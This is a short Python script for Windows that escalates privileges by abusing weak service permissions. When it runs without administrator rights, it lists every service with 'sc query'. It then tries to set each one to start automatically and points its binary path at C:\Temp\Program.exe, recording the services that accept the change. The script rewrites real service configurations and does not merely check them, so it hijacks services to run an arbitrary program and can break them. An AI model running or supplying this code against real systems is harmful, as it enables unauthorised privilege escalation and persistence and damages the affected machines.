import subprocess
import ctypes

def weak():
    if is_admin() == False:
        services_name = []
        vulnerable = []
        output = subprocess.check_output("sc query state=all")
        output = output.decode("utf-8")
        lines = output.split("\n")
        for line in lines:
            if "SERVICE_NAME" in line:
                service = line.split(": ")[1]
                service = service.replace("\r", "")
                services_name.append(service)
            else:
                pass
        for service in services_name:
            try:
                subprocess.check_output("sc config {} start=Auto".format(service))
                subprocess.Popen(f"sc config {service} binPath=C:\Temp\Program.exe")
                vulnerable.append(service)
            except subprocess.CalledProcessError:
                pass
        if vulnerable == []:
            return("No vulnerable service path detected")
        else:
            return(vulnerable)
    else:
        return("You already have administrator")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
